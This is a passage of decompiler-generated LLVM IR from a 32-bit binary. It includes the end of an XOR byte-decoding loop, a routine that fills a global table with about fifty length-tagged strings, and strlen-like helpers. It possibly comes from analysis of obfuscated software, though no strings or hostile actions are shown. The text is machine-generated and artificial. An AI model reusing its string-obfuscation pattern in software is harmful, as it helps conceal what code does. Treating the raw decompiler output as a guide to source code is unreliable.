  %v0_805134a = load i32, i32* %ecx.global-to-local, align 4
  %v1_805134a = inttoptr i32 %v0_805134a to i32*
  %v2_805134a = load i32, i32* %v1_805134a, align 4
  %v2_805134c = add i32 %v2_805134a, %v0_8051348
  %v0_805134e = load i32, i32* %esi.global-to-local, align 4
  %v1_8051350 = inttoptr i32 %v2_805134c to i8*
  %v2_8051350 = load i8, i8* %v1_8051350, align 1
  %v4_8051350 = trunc i32 %v0_805134e to i8
  %v5_8051350 = xor i8 %v2_8051350, %v4_8051350
  store i8 %v5_8051350, i8* %v1_8051350, align 1
  %v0_8051352 = load i32, i32* %edx.global-to-local, align 4
  %v0_8051354 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8051354 = inttoptr i32 %v0_8051354 to i32*
  %v2_8051354 = load i32, i32* %v1_8051354, align 4
  %v1_8051356 = add i32 %v0_8051352, 1
  store i32 %v1_8051356, i32* %edx.global-to-local, align 4
  %v2_8051357 = add i32 %v2_8051354, %v0_8051352
  %v2_8051359 = load i8, i8* %stack_var_-44, align 1
  %v1_805135c = inttoptr i32 %v2_8051357 to i8*
  %v2_805135c = load i8, i8* %v1_805135c, align 1
  %v5_805135c = xor i8 %v2_805135c, %v2_8051359
  store i8 %v5_805135c, i8* %v1_805135c, align 1
  %v0_805135e = load i32, i32* %ecx.global-to-local, align 4
  %v1_805135e = add i32 %v0_805135e, 4
  %v2_805135e = inttoptr i32 %v1_805135e to i32*
  %v3_805135e = load i32, i32* %v2_805135e, align 4
  %v1_8051361 = urem i32 %v3_805135e, 65536
  %v1_8051366 = load i32, i32* %edx.global-to-local, align 4
  %v8_8051368 = icmp sgt i32 %v1_8051361, %v1_8051366
  br i1 %v8_8051368, label %dec_label_pc_8051334.dec_label_pc_8051334_crit_edge, label %dec_label_pc_805136a.loopexit

dec_label_pc_8051334.dec_label_pc_8051334_crit_edge: ; preds = %dec_label_pc_8051334
  %v0_805133a.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8051334

dec_label_pc_805136a.loopexit:                    ; preds = %dec_label_pc_8051334
  br label %dec_label_pc_805136a

dec_label_pc_805136a:                             ; preds = %dec_label_pc_805136a.loopexit, %dec_label_pc_8051300
  %v0_8051371 = phi i32 [ %v1_8051361, %dec_label_pc_805136a.loopexit ], [ %v1_8051314, %dec_label_pc_8051300 ]
  ret i32 %v0_8051371

; uselistorder directives
  uselistorder i32 %v1_8051366, { 1, 0 }
  uselistorder i32 %v1_8051361, { 1, 0 }
  uselistorder i32 %v0_805135e, { 1, 0 }
  uselistorder i32 %v1_8051314, { 3, 4, 0, 1, 2, 5 }
  uselistorder i8* %stack_var_-44, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_80569a0.52 to i32), i32 4), { 1, 2, 0 }
  uselistorder i16* @global_var_805681c.53, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_80569a0.52 to i32), { 1, 2, 3, 0 }
}

define i32 @function_8051380() local_unnamed_addr {
dec_label_pc_8051380:
  %v1_8051386 = call i32 @function_8052b84(i32 12)
  store i32 %v1_8051386, i32* @ebx, align 4
  %v4_8051398 = call i32 @function_8051cb0(i32 %v1_8051386, i32 ptrtoint ([13 x i8]* @global_var_8054d64.54 to i32), i32 12)
  %v0_805139d = load i32, i32* @ebx, align 4
  store i32 %v0_805139d, i32* @global_var_80569b8.55, align 8
  store i16 12, i16* bitcast (i32* @global_var_80569bc.56 to i16*), align 4
  %v1_80513b3 = call i32 @function_8052b84(i32 2)
  store i32 %v1_80513b3, i32* @ebx, align 4
  %v4_80513c5 = call i32 @function_8051cb0(i32 %v1_80513b3, i32 ptrtoint (i32* @global_var_8054d71.57 to i32), i32 2)
  %v0_80513ca = load i32, i32* @ebx, align 4
  store i32 %v0_80513ca, i32* @global_var_80569c0.58, align 64
  store i16 2, i16* bitcast (i32* @global_var_80569c4.59 to i16*), align 4
  %v1_80513e0 = call i32 @function_8052b84(i32 12)
  store i32 %v1_80513e0, i32* @ebx, align 4
  %v4_80513f2 = call i32 @function_8051cb0(i32 %v1_80513e0, i32 ptrtoint ([13 x i8]* @global_var_8054d64.54 to i32), i32 12)
  %v0_80513f7 = load i32, i32* @ebx, align 4
  store i32 %v0_80513f7, i32* @global_var_8056a30.60, align 16
  store i16 12, i16* bitcast (i32* @global_var_8056a34.61 to i16*), align 4
  %v1_805140d = call i32 @function_8052b84(i32 2)
  store i32 %v1_805140d, i32* @ebx, align 4
  %v4_805141f = call i32 @function_8051cb0(i32 %v1_805140d, i32 ptrtoint (i32* @global_var_8054d74.62 to i32), i32 2)
  %v0_8051424 = load i32, i32* @ebx, align 4
  store i32 %v0_8051424, i32* @global_var_8056a38.63, align 8
  store i16 2, i16* bitcast (i32* @global_var_8056a3c.64 to i16*), align 4
  %v1_805143a = call i32 @function_8052b84(i32 15)
  store i32 %v1_805143a, i32* @ebx, align 4
  %v4_805144c = call i32 @function_8051cb0(i32 %v1_805143a, i32 ptrtoint (i32* @global_var_8054d77.65 to i32), i32 15)
  %v0_8051451 = load i32, i32* @ebx, align 4
  store i32 %v0_8051451, i32* @global_var_80569b0.66, align 16
  store i16 15, i16* bitcast (i32* @global_var_80569b4.67 to i16*), align 4
  %v1_8051467 = call i32 @function_8052b84(i32 29)
  store i32 %v1_8051467, i32* @ebx, align 4
  %v4_8051479 = call i32 @function_8051cb0(i32 %v1_8051467, i32 ptrtoint (i32* @global_var_8054d87.68 to i32), i32 29)
  %v0_805147e = load i32, i32* @ebx, align 4
  store i32 %v0_805147e, i32* @global_var_80569c8.69, align 8
  store i16 29, i16* bitcast (i32* @global_var_80569cc.70 to i16*), align 4
  %v1_8051494 = call i32 @function_8052b84(i32 7)
  store i32 %v1_8051494, i32* @ebx, align 4
  %v4_80514a6 = call i32 @function_8051cb0(i32 %v1_8051494, i32 ptrtoint ([8 x i8]* @global_var_8054da5.71 to i32), i32 7)
  %v0_80514ab = load i32, i32* @ebx, align 4
  store i32 %v0_80514ab, i32* @global_var_80569d0.72, align 16
  store i16 7, i16* bitcast (i32* @global_var_80569d4.73 to i16*), align 4
  %v1_80514c1 = call i32 @function_8052b84(i32 5)
  store i32 %v1_80514c1, i32* @ebx, align 4
  %v4_80514d3 = call i32 @function_8051cb0(i32 %v1_80514c1, i32 ptrtoint ([6 x i8]* @global_var_8054dad.74 to i32), i32 5)
  %v0_80514d8 = load i32, i32* @ebx, align 4
  store i32 %v0_80514d8, i32* @global_var_80569d8.75, align 8
  store i16 5, i16* bitcast (i32* @global_var_80569dc.76 to i16*), align 4
  %v1_80514ee = call i32 @function_8052b84(i32 11)
  store i32 %v1_80514ee, i32* @ebx, align 4
  %v4_8051500 = call i32 @function_8051cb0(i32 %v1_80514ee, i32 ptrtoint (i32* @global_var_8054db3.77 to i32), i32 11)
  %v0_8051505 = load i32, i32* @ebx, align 4
  store i32 %v0_8051505, i32* @global_var_80569e0.78, align 32
  store i16 11, i16* bitcast (i32* @global_var_80569e4.79 to i16*), align 4
  %v1_805151b = call i32 @function_8052b84(i32 4)
  store i32 %v1_805151b, i32* @ebx, align 4
  %v4_805152d = call i32 @function_8051cb0(i32 %v1_805151b, i32 ptrtoint ([5 x i8]* @global_var_8054dbf.80 to i32), i32 4)
  %v0_8051532 = load i32, i32* @ebx, align 4
  store i32 %v0_8051532, i32* @global_var_80569e8.81, align 8
  store i16 4, i16* bitcast (i32* @global_var_80569ec.82 to i16*), align 4
  %v1_8051548 = call i32 @function_8052b84(i32 7)
  store i32 %v1_8051548, i32* @ebx, align 4
  %v4_805155a = call i32 @function_8051cb0(i32 %v1_8051548, i32 ptrtoint ([8 x i8]* @global_var_8054dc4.83 to i32), i32 7)
  %v0_805155f = load i32, i32* @ebx, align 4
  store i32 %v0_805155f, i32* @global_var_80569f0.84, align 16
  store i16 7, i16* bitcast (i32* @global_var_80569f4.85 to i16*), align 4
  %v1_8051575 = call i32 @function_8052b84(i32 8)
  store i32 %v1_8051575, i32* @ebx, align 4
  %v4_8051587 = call i32 @function_8051cb0(i32 %v1_8051575, i32 ptrtoint ([9 x i8]* @global_var_8054dcc.86 to i32), i32 8)
  %v0_805158c = load i32, i32* @ebx, align 4
  store i32 %v0_805158c, i32* @global_var_80569f8.87, align 8
  store i16 8, i16* bitcast (i32* @global_var_80569fc.88 to i16*), align 4
  %v1_80515a2 = call i32 @function_8052b84(i32 13)
  store i32 %v1_80515a2, i32* @ebx, align 4
  %v4_80515b4 = call i32 @function_8051cb0(i32 %v1_80515a2, i32 ptrtoint (i32* @global_var_8054dd5.89 to i32), i32 13)
  %v0_80515b9 = load i32, i32* @ebx, align 4
  store i32 %v0_80515b9, i32* @global_var_8056a00.90, align 512
  store i16 13, i16* bitcast (i32* @global_var_8056a04.91 to i16*), align 4
  %v1_80515cf = call i32 @function_8052b84(i32 10)
  store i32 %v1_80515cf, i32* @ebx, align 4
  %v4_80515e1 = call i32 @function_8051cb0(i32 %v1_80515cf, i32 ptrtoint ([11 x i8]* @global_var_8054de3.92 to i32), i32 10)
  %v0_80515e6 = load i32, i32* @ebx, align 4
  store i32 %v0_80515e6, i32* @global_var_8056a08.93, align 8
  store i16 10, i16* bitcast (i32* @global_var_8056a0c.94 to i16*), align 4
  %v1_80515fc = call i32 @function_8052b84(i32 10)
  store i32 %v1_80515fc, i32* @ebx, align 4
  %v4_805160e = call i32 @function_8051cb0(i32 %v1_80515fc, i32 ptrtoint ([11 x i8]* @global_var_8054dee.95 to i32), i32 10)
  %v0_8051613 = load i32, i32* @ebx, align 4
  store i32 %v0_8051613, i32* @global_var_8056a10.96, align 16
  store i16 10, i16* bitcast (i32* @global_var_8056a14.97 to i16*), align 4
  %v1_8051629 = call i32 @function_8052b84(i32 33)
  store i32 %v1_8051629, i32* @ebx, align 4
  %v4_805163b = call i32 @function_8051cb0(i32 %v1_8051629, i32 ptrtoint (i32* @global_var_8054f6c.98 to i32), i32 33)
  %v0_8051640 = load i32, i32* @ebx, align 4
  store i32 %v0_8051640, i32* @global_var_8056a18.99, align 8
  store i16 33, i16* bitcast (i32* @global_var_8056a1c.100 to i16*), align 4
  %v1_8051656 = call i32 @function_8052b84(i32 8)
  store i32 %v1_8051656, i32* @ebx, align 4
  %v4_8051668 = call i32 @function_8051cb0(i32 %v1_8051656, i32 ptrtoint ([9 x i8]* @global_var_8054df9.101 to i32), i32 8)
  %v0_805166d = load i32, i32* @ebx, align 4
  store i32 %v0_805166d, i32* @global_var_8056a20.102, align 32
  store i16 8, i16* bitcast (i32* @global_var_8056a24.103 to i16*), align 4
  %v1_8051683 = call i32 @function_8052b84(i32 11)
  store i32 %v1_8051683, i32* @ebx, align 4
  %v4_8051695 = call i32 @function_8051cb0(i32 %v1_8051683, i32 ptrtoint ([12 x i8]* @global_var_8054e02.104 to i32), i32 11)
  %v0_805169a = load i32, i32* @ebx, align 4
  store i32 %v0_805169a, i32* @global_var_8056a28.105, align 8
  store i16 11, i16* bitcast (i32* @global_var_8056a2c.106 to i16*), align 4
  %v1_80516b0 = call i32 @function_8052b84(i32 6)
  store i32 %v1_80516b0, i32* @ebx, align 4
  %v4_80516c2 = call i32 @function_8051cb0(i32 %v1_80516b0, i32 ptrtoint ([7 x i8]* @global_var_8054e0e.107 to i32), i32 6)
  %v0_80516c7 = load i32, i32* @ebx, align 4
  store i32 %v0_80516c7, i32* @global_var_8056a40.108, align 64
  store i16 6, i16* bitcast (i32* @global_var_8056a44.109 to i16*), align 4
  %v1_80516dd = call i32 @function_8052b84(i32 7)
  store i32 %v1_80516dd, i32* @ebx, align 4
  %v4_80516ef = call i32 @function_8051cb0(i32 %v1_80516dd, i32 ptrtoint ([8 x i8]* @global_var_8054e15.110 to i32), i32 7)
  %v0_80516f4 = load i32, i32* @ebx, align 4
  store i32 %v0_80516f4, i32* @global_var_8056a48.111, align 8
  store i16 7, i16* bitcast (i32* @global_var_8056a4c.112 to i16*), align 4
  %v1_805170a = call i32 @function_8052b84(i32 7)
  store i32 %v1_805170a, i32* @ebx, align 4
  %v4_805171c = call i32 @function_8051cb0(i32 %v1_805170a, i32 ptrtoint ([8 x i8]* @global_var_8054e1d.113 to i32), i32 7)
  %v0_8051721 = load i32, i32* @ebx, align 4
  store i32 %v0_8051721, i32* @global_var_8056a50.114, align 16
  store i16 7, i16* bitcast (i32* @global_var_8056a54.115 to i16*), align 4
  %v1_8051737 = call i32 @function_8052b84(i32 3)
  store i32 %v1_8051737, i32* @ebx, align 4
  %v4_8051749 = call i32 @function_8051cb0(i32 %v1_8051737, i32 ptrtoint ([4 x i8]* @global_var_8054e25.116 to i32), i32 3)
  %v0_805174e = load i32, i32* @ebx, align 4
  store i32 %v0_805174e, i32* @global_var_8056a58.117, align 8
  store i16 3, i16* bitcast (i32* @global_var_8056a5c.118 to i16*), align 4
  %v1_8051764 = call i32 @function_8052b84(i32 19)
  store i32 %v1_8051764, i32* @ebx, align 4
  %v4_8051776 = call i32 @function_8051cb0(i32 %v1_8051764, i32 ptrtoint (i32* @global_var_8054e29.119 to i32), i32 19)
  %v0_805177b = load i32, i32* @ebx, align 4
  store i32 %v0_805177b, i32* @global_var_8056a60.120, align 32
  store i16 19, i16* bitcast (i32* @global_var_8056a64.121 to i16*), align 4
  %v1_8051791 = call i32 @function_8052b84(i32 24)
  store i32 %v1_8051791, i32* @ebx, align 4
  %v4_80517a3 = call i32 @function_8051cb0(i32 %v1_8051791, i32 ptrtoint (i32* @global_var_8054e3d.122 to i32), i32 24)
  %v0_80517a8 = load i32, i32* @ebx, align 4
  store i32 %v0_80517a8, i32* @global_var_8056a68.123, align 8
  store i16 24, i16* bitcast (i32* @global_var_8056a6c.124 to i16*), align 4
  %v1_80517be = call i32 @function_8052b84(i32 9)
  store i32 %v1_80517be, i32* @ebx, align 4
  %v4_80517d0 = call i32 @function_8051cb0(i32 %v1_80517be, i32 ptrtoint ([10 x i8]* @global_var_8054e56.125 to i32), i32 9)
  %v0_80517d5 = load i32, i32* @ebx, align 4
  store i32 %v0_80517d5, i32* @global_var_8056a70.126, align 16
  store i16 9, i16* bitcast (i32* @global_var_8056a74.127 to i16*), align 4
  %v1_80517eb = call i32 @function_8052b84(i32 16)
  store i32 %v1_80517eb, i32* @ebx, align 4
  %v4_80517fd = call i32 @function_8051cb0(i32 %v1_80517eb, i32 ptrtoint (i32* @global_var_8054e60.128 to i32), i32 16)
  %v0_8051802 = load i32, i32* @ebx, align 4
  store i32 %v0_8051802, i32* @global_var_8056a78.129, align 8
  store i16 16, i16* bitcast (i32* @global_var_8056a7c.130 to i16*), align 4
  %v1_8051818 = call i32 @function_8052b84(i32 22)
  store i32 %v1_8051818, i32* @ebx, align 4
  %v4_805182a = call i32 @function_8051cb0(i32 %v1_8051818, i32 ptrtoint (i32* @global_var_8054e71.131 to i32), i32 22)
  %v0_805182f = load i32, i32* @ebx, align 4
  store i32 %v0_805182f, i32* @global_var_8056a80.132, align 128
  store i16 22, i16* bitcast (i32* @global_var_8056a84.133 to i16*), align 4
  %v1_8051845 = call i32 @function_8052b84(i32 21)
  store i32 %v1_8051845, i32* @ebx, align 4
  %v4_8051857 = call i32 @function_8051cb0(i32 %v1_8051845, i32 ptrtoint (i32* @global_var_8054e88.134 to i32), i32 21)
  %v0_805185c = load i32, i32* @ebx, align 4
  store i32 %v0_805185c, i32* @global_var_8056a88.135, align 8
  store i16 21, i16* bitcast (i32* @global_var_8056a8c.136 to i16*), align 4
  %v1_8051872 = call i32 @function_8052b84(i32 17)
  store i32 %v1_8051872, i32* @ebx, align 4
  %v4_8051884 = call i32 @function_8051cb0(i32 %v1_8051872, i32 ptrtoint ([18 x i8]* @global_var_8054e9e.137 to i32), i32 17)
  %v0_8051889 = load i32, i32* @ebx, align 4
  store i32 %v0_8051889, i32* @global_var_8056a90.138, align 16
  store i16 17, i16* bitcast (i32* @global_var_8056a94.139 to i16*), align 4
  %v1_805189f = call i32 @function_8052b84(i32 12)
  store i32 %v1_805189f, i32* @ebx, align 4
  %v4_80518b1 = call i32 @function_8051cb0(i32 %v1_805189f, i32 ptrtoint (i32* @global_var_8054eb0.140 to i32), i32 12)
  %v0_80518b6 = load i32, i32* @ebx, align 4
  store i32 %v0_80518b6, i32* @global_var_8056a98.141, align 8
  store i16 12, i16* bitcast (i32* @global_var_8056a9c.142 to i16*), align 4
  %v1_80518cc = call i32 @function_8052b84(i32 23)
  store i32 %v1_80518cc, i32* @ebx, align 4
  %v4_80518de = call i32 @function_8051cb0(i32 %v1_80518cc, i32 ptrtoint (i32* @global_var_8054ebd.143 to i32), i32 23)
  %v0_80518e3 = load i32, i32* @ebx, align 4
  store i32 %v0_80518e3, i32* @global_var_8056aa0.144, align 32
  store i16 23, i16* bitcast (i32* @global_var_8056aa4.145 to i16*), align 4
  %v1_80518f9 = call i32 @function_8052b84(i32 83)
  store i32 %v1_80518f9, i32* @ebx, align 4
  %v4_805190b = call i32 @function_8051cb0(i32 %v1_80518f9, i32 ptrtoint (i32* @global_var_8054f90.146 to i32), i32 83)
  %v0_8051910 = load i32, i32* @ebx, align 4
  store i32 %v0_8051910, i32* @global_var_8056aa8.147, align 8
  store i16 83, i16* bitcast (i32* @global_var_8056aac.148 to i16*), align 4
  %v1_8051926 = call i32 @function_8052b84(i32 32)
  store i32 %v1_8051926, i32* @ebx, align 4
  %v4_8051938 = call i32 @function_8051cb0(i32 %v1_8051926, i32 ptrtoint (i32* @global_var_8054fe4.149 to i32), i32 32)
  %v0_805193d = load i32, i32* @ebx, align 4
  store i32 %v0_805193d, i32* @global_var_8056ab0.150, align 16
  store i16 32, i16* bitcast (i32* @global_var_8056ab4.151 to i16*), align 4
  %v1_8051953 = call i32 @function_8052b84(i32 48)
  store i32 %v1_8051953, i32* @ebx, align 4
  %v4_8051965 = call i32 @function_8051cb0(i32 %v1_8051953, i32 ptrtoint (i32* @global_var_8055008.152 to i32), i32 48)
  %v0_805196a = load i32, i32* @ebx, align 4
  store i32 %v0_805196a, i32* @global_var_8056ab8.153, align 8
  store i16 48, i16* bitcast (i32* @global_var_8056abc.154 to i16*), align 4
  %v1_8051980 = call i32 @function_8052b84(i32 12)
  store i32 %v1_8051980, i32* @ebx, align 4
  %v4_8051992 = call i32 @function_8051cb0(i32 %v1_8051980, i32 ptrtoint (i32* @global_var_8054ed5.155 to i32), i32 12)
  %v0_8051997 = load i32, i32* @ebx, align 4
  store i32 %v0_8051997, i32* @global_var_8056ac0.156, align 64
  store i16 12, i16* bitcast (i32* @global_var_8056ac4.157 to i16*), align 4
  %v1_80519ad = call i32 @function_8052b84(i32 9)
  store i32 %v1_80519ad, i32* @ebx, align 4
  %v4_80519bf = call i32 @function_8051cb0(i32 %v1_80519ad, i32 ptrtoint (i32* @global_var_8054ee2.158 to i32), i32 9)
  %v0_80519c4 = load i32, i32* @ebx, align 4
  store i32 %v0_80519c4, i32* @global_var_8056ac8.159, align 8
  store i16 9, i16* bitcast (i32* @global_var_8056acc.160 to i16*), align 4
  %v1_80519da = call i32 @function_8052b84(i32 10)
  store i32 %v1_80519da, i32* @ebx, align 4
  %v4_80519ec = call i32 @function_8051cb0(i32 %v1_80519da, i32 ptrtoint (i32* @global_var_8054eec.161 to i32), i32 10)
  %v0_80519f1 = load i32, i32* @ebx, align 4
  store i32 %v0_80519f1, i32* @global_var_8056ad0.162, align 16
  store i16 10, i16* bitcast (i32* @global_var_8056ad4.163 to i16*), align 4
  %v1_8051a07 = call i32 @function_8052b84(i32 12)
  store i32 %v1_8051a07, i32* @ebx, align 4
  %v4_8051a19 = call i32 @function_8051cb0(i32 %v1_8051a07, i32 ptrtoint (i32* @global_var_8054ef7.164 to i32), i32 12)
  %v0_8051a1e = load i32, i32* @ebx, align 4
  store i32 %v0_8051a1e, i32* @global_var_8056ad8.165, align 8
  store i16 12, i16* bitcast (i32* @global_var_8056adc.166 to i16*), align 4
  %v1_8051a34 = call i32 @function_8052b84(i32 16)
  store i32 %v1_8051a34, i32* @ebx, align 4
  %v4_8051a46 = call i32 @function_8051cb0(i32 %v1_8051a34, i32 ptrtoint (i32* @global_var_8054f04.167 to i32), i32 16)
  %v0_8051a4b = load i32, i32* @ebx, align 4
  store i32 %v0_8051a4b, i32* @global_var_8056ae0.168, align 32
  store i16 16, i16* bitcast (i32* @global_var_8056ae4.169 to i16*), align 4
  %v1_8051a61 = call i32 @function_8052b84(i32 19)
  store i32 %v1_8051a61, i32* @ebx, align 4
  %v4_8051a73 = call i32 @function_8051cb0(i32 %v1_8051a61, i32 ptrtoint (i32* @global_var_8054f15.170 to i32), i32 19)
  %v0_8051a78 = load i32, i32* @ebx, align 4
  store i32 %v0_8051a78, i32* @global_var_8056ae8.171, align 8
  store i16 19, i16* bitcast (i32* @global_var_8056aec.172 to i16*), align 4
  %v1_8051a8e = call i32 @function_8052b84(i32 8)
  store i32 %v1_8051a8e, i32* @ebx, align 4
  %v4_8051aa0 = call i32 @function_8051cb0(i32 %v1_8051a8e, i32 ptrtoint ([9 x i8]* @global_var_8054f29.173 to i32), i32 8)
  %v0_8051aa5 = load i32, i32* @ebx, align 4
  store i32 %v0_8051aa5, i32* @global_var_8056af0.174, align 16
  store i16 8, i16* bitcast (i32* @global_var_8056af4.175 to i16*), align 4
  %v1_8051abb = call i32 @function_8052b84(i32 11)
  store i32 %v1_8051abb, i32* @ebx, align 4
  %v4_8051acd = call i32 @function_8051cb0(i32 %v1_8051abb, i32 ptrtoint (i32* @global_var_8054ec9.176 to i32), i32 11)
  %v0_8051ad2 = load i32, i32* @ebx, align 4
  store i32 %v0_8051ad2, i32* @global_var_8056af8.177, align 8
  store i16 11, i16* bitcast (i32* @global_var_8056afc.178 to i16*), align 4
  %v1_8051ae8 = call i32 @function_8052b84(i32 12)
  store i32 %v1_8051ae8, i32* @ebx, align 4
  %v4_8051afa = call i32 @function_8051cb0(i32 %v1_8051ae8, i32 ptrtoint (i32* @global_var_8054f32.179 to i32), i32 12)
  %v0_8051aff = load i32, i32* @ebx, align 4
  store i32 %v0_8051aff, i32* @global_var_8056b00.180, align 256
  store i16 12, i16* bitcast (i32* @global_var_8056b04.181 to i16*), align 4
  %v1_8051b15 = call i32 @function_8052b84(i32 18)
  store i32 %v1_8051b15, i32* @ebx, align 4
  %v4_8051b27 = call i32 @function_8051cb0(i32 %v1_8051b15, i32 ptrtoint (i32* @global_var_8054f3f.182 to i32), i32 18)
  %v0_8051b2c = load i32, i32* @ebx, align 4
  store i32 %v0_8051b2c, i32* @global_var_8056b08.183, align 8
  store i16 18, i16* bitcast (i32* @global_var_8056b0c.184 to i16*), align 4
  %v1_8051b42 = call i32 @function_8052b84(i32 25)
  store i32 %v1_8051b42, i32* @ebx, align 4
  %v4_8051b54 = call i32 @function_8051cb0(i32 %v1_8051b42, i32 ptrtoint (i32* @global_var_8054f52.185 to i32), i32 25)
  %v0_8051b59 = load i32, i32* @ebx, align 4
  store i32 %v0_8051b59, i32* @global_var_8056b10.186, align 16
  store i16 25, i16* bitcast (i32* @global_var_8056b14.187 to i16*), align 4
  %v1_8051b6f = call i32 @function_8052b84(i32 111)
  store i32 %v1_8051b6f, i32* @ebx, align 4
  %v4_8051b81 = call i32 @function_8051cb0(i32 %v1_8051b6f, i32 ptrtoint (i32* @global_var_805503c.188 to i32), i32 111)
  %v0_8051b86 = load i32, i32* @ebx, align 4
  store i32 %v0_8051b86, i32* @global_var_8056b18.189, align 8
  store i16 111, i16* bitcast (i32* @global_var_8056b1c.190 to i16*), align 4
  %v1_8051b9c = call i32 @function_8052b84(i32 111)
  store i32 %v1_8051b9c, i32* @ebx, align 4
  %v4_8051bae = call i32 @function_8051cb0(i32 %v1_8051b9c, i32 ptrtoint (i32* @global_var_80550ac.191 to i32), i32 111)
  %v0_8051bb3 = load i32, i32* @ebx, align 4
  store i32 %v0_8051bb3, i32* @global_var_8056b20.192, align 32
  store i16 111, i16* bitcast (i32* @global_var_8056b24.193 to i16*), align 4
  %v1_8051bc9 = call i32 @function_8052b84(i32 110)
  store i32 %v1_8051bc9, i32* @ebx, align 4
  %v4_8051bdb = call i32 @function_8051cb0(i32 %v1_8051bc9, i32 ptrtoint (i32* @global_var_805511c.194 to i32), i32 110)
  %v0_8051be0 = load i32, i32* @ebx, align 4
  store i32 %v0_8051be0, i32* @global_var_8056b28.195, align 8
  store i16 110, i16* bitcast (i32* @global_var_8056b2c.196 to i16*), align 4
  %v1_8051bf6 = call i32 @function_8052b84(i32 110)
  store i32 %v1_8051bf6, i32* @ebx, align 4
  %v4_8051c08 = call i32 @function_8051cb0(i32 %v1_8051bf6, i32 ptrtoint (i32* @global_var_805518c.197 to i32), i32 110)
  %v0_8051c0d = load i32, i32* @ebx, align 4
  store i32 %v0_8051c0d, i32* @global_var_8056b30.198, align 16
  store i16 110, i16* bitcast (i32* @global_var_8056b34.199 to i16*), align 4
  %v1_8051c23 = call i32 @function_8052b84(i32 117)
  store i32 %v1_8051c23, i32* @ebx, align 4
  %v4_8051c35 = call i32 @function_8051cb0(i32 %v1_8051c23, i32 ptrtoint (i32* @global_var_80551fc.200 to i32), i32 117)
  %v0_8051c3a = load i32, i32* @ebx, align 4
  store i32 %v0_8051c3a, i32* @global_var_8056b38.201, align 8
  store i16 117, i16* bitcast (i32* @global_var_8056b3c.202 to i16*), align 4
  ret i32 %v4_8051c35

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @function_8051cb0, { 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @function_8051c50(i8* %arg1) local_unnamed_addr {
dec_label_pc_8051c50:
  %v4_8051c50 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051c50, i32* @edx, align 4
  %v2_8051c56 = load i8, i8* %arg1, align 1
  %v3_8051c56 = icmp eq i8 %v2_8051c56, 0
  br i1 %v3_8051c56, label %dec_label_pc_8051c67, label %dec_label_pc_8051c60

dec_label_pc_8051c60:                             ; preds = %dec_label_pc_8051c50, %dec_label_pc_8051c60
  %v0_8051c60 = phi i32 [ %v1_8051c60, %dec_label_pc_8051c60 ], [ 0, %dec_label_pc_8051c50 ]
  %v1_8051c60 = add i32 %v0_8051c60, 1
  %v2_8051c61 = add i32 %v1_8051c60, %v4_8051c50
  %v3_8051c61 = inttoptr i32 %v2_8051c61 to i8*
  %v4_8051c61 = load i8, i8* %v3_8051c61, align 1
  %v5_8051c61 = icmp eq i8 %v4_8051c61, 0
  %v1_8051c65 = icmp eq i1 %v5_8051c61, false
  br i1 %v1_8051c65, label %dec_label_pc_8051c60, label %dec_label_pc_8051c67

dec_label_pc_8051c67:                             ; preds = %dec_label_pc_8051c60, %dec_label_pc_8051c50
  %v0_8051c67 = phi i32 [ 0, %dec_label_pc_8051c50 ], [ %v1_8051c60, %dec_label_pc_8051c60 ]
  ret i32 %v0_8051c67

; uselistorder directives
  uselistorder label %dec_label_pc_8051c60, { 1, 0 }
}

define i32 @function_8051c70(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8051c70:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp15 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8051c71 = load i32, i32* @ebx, align 4
  store i32 %v0_8051c71, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v4_8051c76 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051c76, i32* %edx.global-to-local, align 4
  %v2_8051c7a = load i8, i8* %tmp15, align 1
  %v3_8051c7a = icmp eq i8 %v2_8051c7a, 0
  br i1 %v3_8051c7a, label %dec_label_pc_8051ca4, label %dec_label_pc_8051c7f

dec_label_pc_8051c7f:                             ; preds = %dec_label_pc_8051c70
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051c81

dec_label_pc_8051c81:                             ; preds = %dec_label_pc_8051c81, %dec_label_pc_8051c7f
  %v0_8051c81 = phi i32 [ %v1_8051c81, %dec_label_pc_8051c81 ], [ 0, %dec_label_pc_8051c7f ]
  %v1_8051c81 = add i32 %v0_8051c81, 1
  store i32 %v1_8051c81, i32* %esi.global-to-local, align 4
  %v2_8051c82 = add i32 %v1_8051c81, %arg2
  %v3_8051c82 = inttoptr i32 %v2_8051c82 to i8*
  %v4_8051c82 = load i8, i8* %v3_8051c82, align 1
  %v5_8051c82 = icmp eq i8 %v4_8051c82, 0
  %v1_8051c86 = icmp eq i1 %v5_8051c82, false
  br i1 %v1_8051c86, label %dec_label_pc_8051c81, label %dec_label_pc_8051c88

dec_label_pc_8051c88:                             ; preds = %dec_label_pc_8051c81
  %v10_8051c88 = icmp eq i32 %v0_8051c81, -2
  br i1 %v10_8051c88, label %dec_label_pc_8051c9f, label %dec_label_pc_8051c8d

dec_label_pc_8051c8d:                             ; preds = %dec_label_pc_8051c88
  store i32 %v4_8051c76, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %v1_8051c81, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051c93

dec_label_pc_8051c93:                             ; preds = %dec_label_pc_8051ca4, %dec_label_pc_8051c8d, %dec_label_pc_8051c93.dec_label_pc_8051c93_crit_edge
  %v2_8051c96 = phi i32 [ %v1_8051c99, %dec_label_pc_8051c93.dec_label_pc_8051c93_crit_edge ], [ %v4_8051c76, %dec_label_pc_8051c8d ], [ %v4_8051c76, %dec_label_pc_8051ca4 ]
